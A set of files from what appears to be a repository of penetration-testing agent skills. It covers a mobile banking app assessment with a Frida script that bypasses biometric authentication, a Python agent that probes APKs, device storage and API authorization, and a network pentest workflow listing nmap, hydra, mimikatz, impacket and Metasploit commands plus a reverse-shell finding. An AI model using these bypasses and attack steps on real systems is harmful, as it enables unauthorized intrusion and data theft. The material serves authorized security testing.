- **MobSF (Mobile Security Framework)**: Automated static and dynamic analysis platform for Android and iOS applications
- **jadx**: Android decompiler that converts APK bytecode to readable Java source code for manual code review
- **Burp Suite Professional**: HTTP proxy for intercepting and modifying mobile app API traffic after bypassing certificate pinning

## Common Scenarios

### Scenario: Mobile Banking Application Security Assessment

**Context**: A bank is launching a new mobile banking app for iOS and Android. The app handles account viewing, fund transfers, bill payment, and check deposit. OWASP MASVS L2 compliance is required due to the financial data handled.

**Approach**:
1. Static analysis of the Android APK reveals API endpoints, a hardcoded staging server URL, and an AWS API key in a configuration file
2. Certificate pinning is implemented but bypassed with Frida SSL pinning bypass script
3. API traffic analysis reveals that the balance check endpoint returns all account numbers associated with the user, not just the requested account
4. Local data storage analysis finds that the app caches the last 10 transactions in an unencrypted SQLite database
5. Biometric authentication bypass: Frida hook on the biometric callback always returns success, granting access without fingerprint
6. Root detection is present but bypassed with Magisk Hide module, allowing the app to run on a rooted device with full data access

**Pitfalls**:
- Testing only on an emulator and missing hardware-specific security features (Android Keystore hardware backing, iOS Secure Enclave)
- Not testing both iOS and Android versions, as they may have different implementations and different vulnerabilities
- Ignoring the backend API security because it was "tested separately" when the mobile app may call API endpoints differently than the web app
- Failing to test certificate pinning bypass, resulting in an incomplete network analysis

## Output Format

```
## Finding: Biometric Authentication Bypass via Frida Instrumentation

**ID**: MOB-003
**Severity**: High (CVSS 7.7)
**Platform**: Android and iOS
**OWASP MASVS**: MASVS-AUTH-2 (Biometric Authentication)

**Description**:
The mobile banking app's biometric authentication can be bypassed using Frida
dynamic instrumentation. The authentication callback function accepts a boolean
result from the biometric API, which can be hooked and forced to return true
without presenting a valid fingerprint or face scan.

**Proof of Concept (Android)**:
frida -U -f com.bank.mobileapp -l bypass-biometric.js --no-pause

// bypass-biometric.js
Java.perform(function() {
  var BiometricCallback = Java.use("com.bank.mobileapp.auth.BiometricCallback");
  BiometricCallback.onAuthenticationSucceeded.implementation = function(result) {
    console.log("[*] Biometric bypassed");
    this.onAuthenticationSucceeded(result);
  };
});

**Impact**:
An attacker with physical access to an unlocked device can bypass biometric
authentication and access the victim's bank accounts, initiate transfers,
and view financial data without biometric verification.

**Remediation**:
1. Implement server-side biometric verification using Android BiometricPrompt
   CryptoObject tied to a Keystore key
2. Require the biometric operation to decrypt a server-side challenge, making
   client-side bypass ineffective
3. Add runtime integrity checks to detect Frida and other instrumentation frameworks
4. Implement step-up authentication for high-risk operations (transfers > threshold)
```

===== END FILE =====


===== FILE: skills/conducting-mobile-app-penetration-test/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/conducting-mobile-app-penetration-test/references/api-reference.md =====
# API Reference: Mobile App Penetration Testing Agent

## Overview

Tests Android mobile applications for OWASP MASTG vulnerabilities: insecure storage, hardcoded secrets, manifest misconfigurations, certificate pinning bypass, and API authorization flaws. For authorized testing only.

## Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| requests | >=2.28 | API and cert pinning testing |
| apktool | >=2.7 | APK decompilation (subprocess) |
| adb | - | Android device interaction (subprocess) |

## CLI Usage

```bash
python agent.py --apk target.apk --manifest AndroidManifest.xml \
  --api-url https://api.target.com --auth-token <jwt> --output report.json
```

## Key Functions

### `decompile_apk(apk_path, output_dir)`
Decompiles APK using apktool for static analysis of smali code and resources.

### `extract_strings_from_apk(apk_path)`
Extracts hardcoded sensitive strings (API keys, passwords, tokens, URLs) from APK binary.

### `check_android_manifest(manifest_path)`
Analyzes AndroidManifest.xml for debuggable, allowBackup, exported components, and cleartext traffic settings.

### `test_certificate_pinning(target_url)`
Tests if API connections succeed through a proxy (indicating missing cert pinning).

### `check_insecure_storage_adb()`
Checks shared_prefs, databases, and external storage for sensitive data via adb shell.

### `test_api_endpoints(base_url, endpoints, auth_token)`
Tests API endpoints for authorization bypass by comparing authenticated vs unauthenticated responses.

### `check_root_detection(package_name)`
Inspects the app package for root detection library indicators (RootBeer, SafetyNet).

## OWASP MASTG Coverage

| Category | Test | Function |
|----------|------|----------|
| MASVS-STORAGE | Insecure Data Storage | `check_insecure_storage_adb` |
| MASVS-STORAGE | Hardcoded Credentials | `extract_strings_from_apk` |
| MASVS-NETWORK | Certificate Pinning | `test_certificate_pinning` |
| MASVS-NETWORK | Cleartext Traffic | `check_android_manifest` |
| MASVS-AUTH | API Authorization | `test_api_endpoints` |
| MASVS-RESILIENCE | Root Detection | `check_root_detection` |

===== END FILE =====


===== FILE: skills/conducting-mobile-app-penetration-test/scripts/agent.py =====
#!/usr/bin/env python3
# For authorized penetration testing and lab environments only
"""Mobile App Penetration Testing Agent - Tests Android/iOS apps for OWASP MASTG vulnerabilities."""

import json
import logging
import argparse
import subprocess
from datetime import datetime

import requests

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)


def decompile_apk(apk_path, output_dir):
    """Decompile Android APK using apktool for static analysis."""
    cmd = ["apktool", "d", apk_path, "-o", output_dir, "-f"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    if result.returncode == 0:
        logger.info("APK decompiled to %s", output_dir)
        return True
    logger.error("Decompilation failed: %s", result.stderr[:200])
    return False


def extract_strings_from_apk(apk_path):
    """Extract hardcoded strings from APK for sensitive data detection."""
    cmd = ["strings", apk_path]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    sensitive_patterns = {
        "api_key": [], "password": [], "secret": [], "token": [],
        "http://": [], "aws_access": [], "private_key": [],
    }
    for line in result.stdout.split("\n"):
        line_lower = line.strip().lower()
        for pattern in sensitive_patterns:
            if pattern in line_lower and len(line.strip()) < 200:
                sensitive_patterns[pattern].append(line.strip())
    total = sum(len(v) for v in sensitive_patterns.values())
    logger.info("Extracted %d sensitive strings from APK", total)
    return sensitive_patterns


def check_android_manifest(manifest_path):
    """Analyze AndroidManifest.xml for security misconfigurations."""
    findings = []
    with open(manifest_path, "r", errors="ignore") as f:
        content = f.read()
    checks = [
        ("android:debuggable=\"true\"", "App is debuggable - allows runtime manipulation"),
        ("android:allowBackup=\"true\"", "Backup allowed - data extractable via adb backup"),
        ("android:exported=\"true\"", "Components exported without permission protection"),
        ("android:usesCleartextTraffic=\"true\"", "Cleartext HTTP traffic allowed"),
        ("android:networkSecurityConfig", None),
    ]
    for pattern, description in checks:
        if description and pattern in content:
            findings.append({"check": pattern, "finding": description, "severity": "Medium"})
    if "android:networkSecurityConfig" not in content:
        findings.append({
            "check": "Missing networkSecurityConfig",
            "finding": "No custom network security configuration - may trust user-installed CAs",
            "severity": "Medium",
        })
    logger.info("Manifest analysis: %d findings", len(findings))
    return findings


def test_certificate_pinning(target_url):
    """Test if the app enforces certificate pinning via mitmproxy check."""
    try:
        resp = requests.get(target_url, timeout=10, verify=False)
        return {
            "url": target_url,
            "status": resp.status_code,
            "pinning_bypassed": resp.status_code == 200,
            "note": "If 200 with proxy active, cert pinning is not enforced",
        }
    except requests.RequestException as e:
        return {"url": target_url, "pinning_bypassed": False, "error": str(e)}


def check_insecure_storage_adb():
    """Check for insecure data storage on connected Android device via adb."""
    checks = [
        ("shared_prefs", "run-as com.target.app ls /data/data/com.target.app/shared_prefs/"),
        ("databases", "run-as com.target.app ls /data/data/com.target.app/databases/"),
        ("external_storage", "ls /sdcard/Android/data/com.target.app/"),
    ]
    findings = []
    for check_name, adb_cmd in checks:
        cmd = ["adb", "shell"] + adb_cmd.split()
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if result.returncode == 0 and result.stdout.strip():
            findings.append({
                "check": check_name,
                "files_found": result.stdout.strip().split("\n"),
                "severity": "High" if check_name == "external_storage" else "Medium",
            })
    logger.info("Storage checks: %d findings", len(findings))
    return findings


def test_api_endpoints(base_url, endpoints, auth_token=None):
    """Test mobile app API endpoints for common vulnerabilities."""
    headers = {}
    if auth_token:
        headers["Authorization"] = f"Bearer {auth_token}"
    results = []
    for endpoint in endpoints:
        url = f"{base_url}{endpoint}"
        try:
            resp = requests.get(url, headers=headers, timeout=10, verify=False)
            result = {
                "endpoint": endpoint,
                "status": resp.status_code,
                "response_size": len(resp.content),
            }
            no_auth_resp = requests.get(url, timeout=10, verify=False)
            if no_auth_resp.status_code == 200 and resp.status_code == 200:
                result["auth_bypass"] = True
                result["severity"] = "Critical"
            else:
                result["auth_bypass"] = False
            results.append(result)
        except requests.RequestException:
            continue
    return results


def check_root_detection(package_name):
    """Check if the app implements root/jailbreak detection."""
    cmd = ["adb", "shell", "pm", "dump", package_name]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    root_indicators = ["rootbeer", "rootdetect", "safetynet", "integrity", "tamper"]
    found = [ind for ind in root_indicators if ind in result.stdout.lower()]
    return {
        "package": package_name,
        "root_detection_indicators": found,
        "likely_protected": len(found) > 0,
    }


def generate_report(apk_analysis, manifest_findings, storage_findings, api_results, cert_pinning):
    """Generate mobile app penetration test report."""
    report = {
        "timestamp": datetime.utcnow().isoformat(),
        "sensitive_strings": {k: len(v) for k, v in apk_analysis.items()},
        "manifest_findings": manifest_findings,
        "storage_findings": storage_findings,
        "api_security": api_results,
        "certificate_pinning": cert_pinning,
    }
    total = len(manifest_findings) + len(storage_findings) + len([r for r in api_results if r.get("auth_bypass")])
    print(f"MOBILE PENTEST REPORT - {total} findings")
    return report


def main():
    parser = argparse.ArgumentParser(description="Mobile App Penetration Testing Agent")
    parser.add_argument("--apk", help="Path to Android APK file")
    parser.add_argument("--manifest", help="Path to AndroidManifest.xml")
    parser.add_argument("--api-url", help="Backend API base URL")
    parser.add_argument("--auth-token", help="Auth token for API testing")
    parser.add_argument("--output", default="mobile_pentest_report.json")
    args = parser.parse_args()

    apk_strings = extract_strings_from_apk(args.apk) if args.apk else {}
    manifest_findings = check_android_manifest(args.manifest) if args.manifest else []
    storage = check_insecure_storage_adb()

    api_results = []
    if args.api_url:
        endpoints = ["/api/v1/user/profile", "/api/v1/users", "/api/v1/settings", "/api/v1/admin"]
        api_results = test_api_endpoints(args.api_url, endpoints, args.auth_token)

    cert_pinning = test_certificate_pinning(args.api_url) if args.api_url else {}

    report = generate_report(apk_strings, manifest_findings, storage, api_results, cert_pinning)
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/conducting-network-penetration-test/SKILL.md =====
---
name: conducting-network-penetration-test
description: 'Conducts comprehensive network penetration tests against authorized
  target environments by performing host discovery, port scanning, service enumeration,
  vulnerability identification, and controlled exploitation to assess the security
  posture of network infrastructure. The tester follows PTES methodology from reconnaissance
  through post-exploitation and reporting. Activates for requests involving network
  pentest, infrastructure security assessment, internal network testing, or external
  perimeter testing.

  '
domain: cybersecurity
subdomain: penetration-testing
tags:
- network-pentest
- Nmap
- Metasploit
- vulnerability-exploitation
- infrastructure-security
version: 1.0.0
author: mahipal
license: Apache-2.0
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1046
- T1595.002
- T1190
- T1210
- T1021
- T1078
---
# Conducting Network Penetration Test

## When to Use

- Assessing the security posture of internal or external network infrastructure before or after deployment
- Validating firewall rules, network segmentation, and access controls under realistic attack conditions
- Identifying exploitable vulnerabilities in network services, protocols, and configurations
- Meeting compliance requirements for PCI-DSS, HIPAA, SOC 2, or ISO 27001 that mandate periodic penetration testing
- Evaluating the effectiveness of IDS/IPS, SIEM, and SOC detection capabilities against real attack traffic

**Do not use** for testing networks without explicit written authorization from the asset owner, against production systems without a pre-approved change window and rollback plan, or for denial-of-service testing unless explicitly scoped and authorized.

## Prerequisites

- Signed Rules of Engagement (RoE) document specifying target IP ranges, excluded hosts, testing hours, and emergency contacts
- Written authorization letter (get-out-of-jail letter) from the network owner
- Dedicated testing laptop with Kali Linux or equivalent distribution with up-to-date tools
- VPN or direct network access to the target scope as defined in the RoE
- Out-of-band communication channel with the client's incident response team
- Scope document listing in-scope IP ranges, domains, and any explicitly excluded systems (medical devices, SCADA, critical infrastructure)

## Workflow

### Step 1: Pre-Engagement and Scope Validation

Validate the scope by confirming IP ranges with the client. Verify that all IP addresses in scope are owned by the client using ARIN/RIPE WHOIS lookups. Confirm testing windows, escalation procedures, and any sensitivity constraints. Set up the testing environment with a dedicated VM, VPN connection, and logging enabled on all tools. Create a timestamped activity log that records every command executed, every scan launched, and every exploit attempted throughout the engagement.

### Step 2: Host Discovery and Network Mapping

Identify live hosts within the authorized scope using layered discovery techniques:

- **ICMP sweep**: `nmap -sn -PE -PP -PM 10.10.0.0/16 -oA discovery_icmp` to find hosts responding to ping
- **ARP scan** (internal networks): `nmap -sn -PR 10.10.0.0/24 -oA discovery_arp` or `arp-scan -l` for local subnet enumeration
- **TCP SYN discovery**: `nmap -sn -PS21,22,25,80,443,445,3389,8080 10.10.0.0/16 -oA discovery_tcp` to find hosts with ICMP blocked
- **UDP discovery**: `nmap -sn -PU53,161,500 10.10.0.0/16 -oA discovery_udp` for hosts only responding on UDP

Consolidate live hosts into a target list. Map the network topology by identifying gateways, VLAN boundaries, and trust relationships using traceroute and SNMP community string guessing where authorized.

### Step 3: Port Scanning and Service Enumeration

Perform detailed port scanning on discovered hosts:

- **Full TCP scan**: `nmap -sS -p- --min-rate 1000 -T4 -oA full_tcp <target>` to identify all open TCP ports
- **Top UDP ports**: `nmap -sU --top-ports 200 -T4 -oA top_udp <target>` for commonly exploitable UDP services
- **Service version detection**: `nmap -sV -sC -p <open_ports> -oA service_enum <target>` to fingerprint service versions and run default NSE scripts
- **OS fingerprinting**: `nmap -O --osscan-guess -oA os_detection <target>` to identify operating systems

Enumerate discovered services in depth using protocol-specific tools:
- SMB: `enum4linux -a <target>`, `crackmapexec smb <target> --shares`
- SNMP: `snmpwalk -v2c -c public <target>`
- DNS: `dig axfr @<dns_server> <domain>` for zone transfer attempts
- LDAP: `ldapsearch -x -H ldap://<target> -b "dc=example,dc=com"`

### Step 4: Vulnerability Identification

Correlate discovered service versions against known vulnerability databases:

- Run `nmap --script vuln -p <ports> <target>` for NSE vulnerability scripts
- Use `searchsploit <service> <version>` to query the Exploit-DB offline database
- Cross-reference with NVD (National Vulnerability Database) and CVE records for confirmed vulnerabilities
- Check for default credentials on management interfaces (Tomcat Manager, Jenkins, phpMyAdmin, database consoles)
- Test for common misconfigurations: anonymous FTP, open SMTP relays, unrestricted SNMP communities, NFS exports without authentication

Prioritize vulnerabilities by CVSS score, exploitability, and business impact. Document each finding with CVE identifier, affected host, service, and version.

### Step 5: Exploitation

Attempt controlled exploitation of validated vulnerabilities using the principle of minimum necessary access:

- **Metasploit Framework**: `msfconsole` with appropriate exploit modules matched to confirmed vulnerabilities. Set RHOSTS, RPORT, and payload options. Prefer bind/reverse TCP Meterpreter for post-exploitation flexibility.
- **Manual exploitation**: Use public proof-of-concept exploits from Exploit-DB after code review. Compile and modify as needed for the target environment.
- **Credential attacks**: Use `hydra` or `crackmapexec` for password spraying against discovered services (SSH, RDP, SMB, HTTP basic auth) using common credential lists. Respect lockout policies.
- **Pass-the-hash / relay**: If NTLM hashes are obtained, attempt pass-the-hash with `impacket-psexec` or relay attacks with `impacket-ntlmrelayx` where SMB signing is disabled.

Document every exploitation attempt including failures. Capture screenshots of successful compromises showing hostname, IP, current user, and privilege level.

### Step 6: Post-Exploitation and Pivoting

After gaining access to a host, demonstrate business impact:

- **Privilege escalation**: Check for local privilege escalation paths using `linpeas.sh` (Linux) or `winPEAS.exe` (Windows). Look for misconfigured services, SUID binaries, unquoted service paths, or kernel exploits.
- **Credential harvesting**: Extract stored credentials from memory (`mimikatz`), files (config files, browser stores), or cached hashes (`hashdump`).
- **Lateral movement**: Use obtained credentials to pivot to additional systems. Test network segmentation by attempting to reach out-of-scope networks from compromised hosts.
- **Data access demonstration**: Identify sensitive data accessible from compromised systems (PII databases, file shares, backup files) and document access without exfiltrating actual data.

Maintain detailed notes on every pivot point, credential obtained, and system accessed to build the attack chain narrative.

### Step 7: Cleanup and Reporting

Remove all testing artifacts from compromised systems:

- Delete uploaded tools, shells, and temporary files
- Remove any accounts created during testing
- Revert configuration changes made during exploitation
- Verify cleanup by re-scanning affected hosts

Prepare the penetration test report with executive summary, methodology description, finding details with CVSS scores, proof-of-concept evidence, and prioritized remediation recommendations.

## Key Concepts

| Term | Definition |
|------|------------|
| **Rules of Engagement (RoE)** | Formal document defining the scope, boundaries, testing hours, authorized actions, and escalation procedures for a penetration test |
| **Pivot** | Using a compromised host as a relay point to access additional network segments not directly reachable from the tester's position |
| **Service Enumeration** | The process of identifying running services, their versions, and configurations on discovered hosts to map the attack surface |
| **Credential Spraying** | Testing a small number of commonly used passwords against many accounts simultaneously to avoid account lockout thresholds |
| **CVSS** | Common Vulnerability Scoring System; an industry-standard framework for rating the severity of vulnerabilities on a 0-10 scale |
| **Lateral Movement** | Techniques used to move from one compromised system to another within a network, expanding the scope of access |
| **Post-Exploitation** | Activities performed after initial compromise including privilege escalation, persistence, credential harvesting, and data access |

## Tools & Systems

- **Nmap**: Network discovery, port scanning, service enumeration, and vulnerability detection via the Nmap Scripting Engine (NSE)
- **Metasploit Framework**: Exploitation framework providing exploit modules, payloads, encoders, and post-exploitation tools for validated vulnerability exploitation
- **CrackMapExec**: Swiss-army knife for Windows/Active Directory environments supporting SMB, WinRM, LDAP, and MSSQL enumeration and exploitation
- **Impacket**: Python library providing low-level programmatic access to network protocols (SMB, MSRPC, Kerberos) used for relay attacks and remote execution
- **Burp Suite**: Web application proxy used when network services expose HTTP-based management interfaces

## Common Scenarios

### Scenario: Internal Network Penetration Test for a Financial Institution

**Context**: The client is a mid-size bank requiring PCI-DSS compliance. Scope includes the internal corporate network (10.10.0.0/16), excluding payment processing systems in a separate VLAN. Testing window is Monday-Friday 20:00-06:00 to minimize impact on operations.

**Approach**:
1. Perform ARP-based host discovery on accessible subnets and TCP SYN discovery for hosts with ICMP disabled
2. Conduct full port scans on all discovered hosts, prioritizing Windows servers and domain controllers
3. Enumerate SMB shares, SNMP communities, and web management interfaces for quick wins
4. Identify and exploit an unpatched Apache Tomcat instance with default credentials to gain initial foothold
5. Escalate privileges via a local Windows kernel vulnerability, then extract cached domain credentials with Mimikatz
6. Demonstrate lateral movement to the database server containing customer records, proving inadequate network segmentation
7. Document the complete attack path from initial access to sensitive data, with remediation steps for each vulnerability

**Pitfalls**:
- Scanning too aggressively during business hours and triggering IDS alerts or service disruptions
- Failing to verify that all target IPs are actually owned by the client before scanning
- Not documenting exploitation attempts that failed, missing the opportunity to report on effective controls
- Forgetting to clean up Meterpreter sessions and uploaded tools after testing

## Output Format

```
## Finding: Unpatched Apache Tomcat with Default Credentials

**ID**: NET-001
**Severity**: Critical (CVSS 9.8)
**Affected Host**: 10.10.5.23 (tomcat-prod.internal.corp)
**Service**: Apache Tomcat 8.5.31 on port 8080
**CVE**: CVE-2019-0232

**Description**:
The Apache Tomcat instance on 10.10.5.23:8080 is running version 8.5.31, which is
vulnerable to CVE-2019-0232 (remote code execution via CGI Servlet). Additionally,
the Tomcat Manager interface is accessible with default credentials (tomcat:tomcat),
allowing deployment of arbitrary WAR files.

**Proof of Concept**:
1. Accessed http://10.10.5.23:8080/manager/html with credentials tomcat:tomcat
2. Deployed malicious WAR file containing a reverse shell payload
3. Obtained command execution as NT AUTHORITY\SYSTEM

**Impact**:
Full system compromise of the Tomcat server. From this host, the tester
pivoted to 3 additional systems on the same subnet using harvested credentials,
ultimately accessing the customer database containing 50,000+ records.

**Remediation**:
1. Immediately change default Tomcat Manager credentials
2. Upgrade Apache Tomcat to the latest stable release (currently 10.1.x)
3. Restrict access to the Tomcat Manager interface to authorized management IPs only
4. Implement network segmentation between web servers and database tier
```

===== END FILE =====


===== FILE: skills/conducting-network-penetration-test/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

